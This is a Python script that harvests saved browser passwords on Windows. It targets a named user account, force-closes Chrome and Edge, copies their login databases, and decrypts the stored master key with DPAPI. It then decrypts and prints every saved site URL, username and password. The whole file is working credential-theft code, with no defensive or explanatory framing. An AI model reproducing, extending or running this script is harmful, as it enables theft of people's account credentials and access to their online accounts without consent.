import os
import json
import base64
import sqlite3
import shutil
import win32crypt  # For Windows DPAPI decryption
from Crypto.Cipher import AES
import subprocess
import time

# Set the target username
USERNAME = "s-zahedi"

# Define paths for browser data (ensuring correct user directory)
BROWSER_PATHS = {
    "Chrome": {
        "db_path": f"C:\\Users\\{USERNAME}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
        "state_path": f"C:\\Users\\{USERNAME}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
    },
    "Edge": {
        "db_path": f"C:\\Users\\{USERNAME}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data",
        "state_path": f"C:\\Users\\{USERNAME}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State"
    }
}

def close_browser():
    """Closes Chrome and Edge to prevent file locks."""
    subprocess.run("taskkill /F /IM chrome.exe", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run("taskkill /F /IM msedge.exe", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)  # Wait for processes to close

def get_encryption_key(state_path):
    """Retrieve AES key from Local State file for decryption."""
    if not os.path.exists(state_path):
        print(f"‚ùå ERROR: Local State file not found: {state_path}")
        return None

    try:
        with open(state_path, "r", encoding="utf-8") as file:
            local_state = json.load(file)

        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]

        # Decrypt using Windows DPAPI
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key
    except Exception as e:
        print(f"‚ùå ERROR: Failed to retrieve encryption key: {e}")
        return None

def decrypt_password(encrypted_password, key):
    """Decrypt AES-encrypted passwords using the extracted key."""
    try:
        iv = encrypted_password[3:15]
        encrypted_password = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()
        return decrypted_password
    except Exception as e:
        return f"Decryption failed: {e}"

def copy_db_file(db_path):
    """Copy the database to avoid file lock errors."""
    if not os.path.exists(db_path):
        print(f"‚ùå ERROR: Database file not found: {db_path}")
        return None

    temp_db_path = db_path + ".temp"
    try:
        shutil.copy2(db_path, temp_db_path)  # Copy file
        return temp_db_path
    except Exception as e:
        print(f"‚ùå ERROR: Failed to copy database: {e}")
        return None

def fetch_passwords(browser_name):
    """Extract and decrypt saved passwords for the specified browser."""
    if browser_name not in BROWSER_PATHS:
        print(f"‚ùå ERROR: {browser_name} is not supported.")
        return

    db_path = BROWSER_PATHS[browser_name]["db_path"]
    state_path = BROWSER_PATHS[browser_name]["state_path"]

    # Validate files exist
    if not os.path.exists(db_path) or not os.path.exists(state_path):
        print(f"‚ùå ERROR: One or more required files are missing for {browser_name}.")
        return

    # Copy the database to avoid lock errors
    temp_db_path = copy_db_file(db_path)
    if not temp_db_path:
        return

    # Retrieve encryption key
    encryption_key = get_encryption_key(state_path)
    if not encryption_key:
        return

    try:
        # Connect to the copied database
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            decrypted_password = decrypt_password(encrypted_password, encryption_key)
            print(f"üîπ URL: {url}\nüë§ Username: {username}\nüîë Password: {decrypted_password}\n")

        cursor.close()
        conn.close()

    except sqlite3.DatabaseError as e:
        print(f"‚ùå ERROR: Failed to read database: {e}")
    
    # Remove the temporary database copy
    os.remove(temp_db_path)

if __name__ == "__main__":
    close_browser()  # Ensure the browser is closed before extracting data
    browser_name = 'Chrome'  # Change this to "Edge" if needed
    fetch_passwords(browser_name)
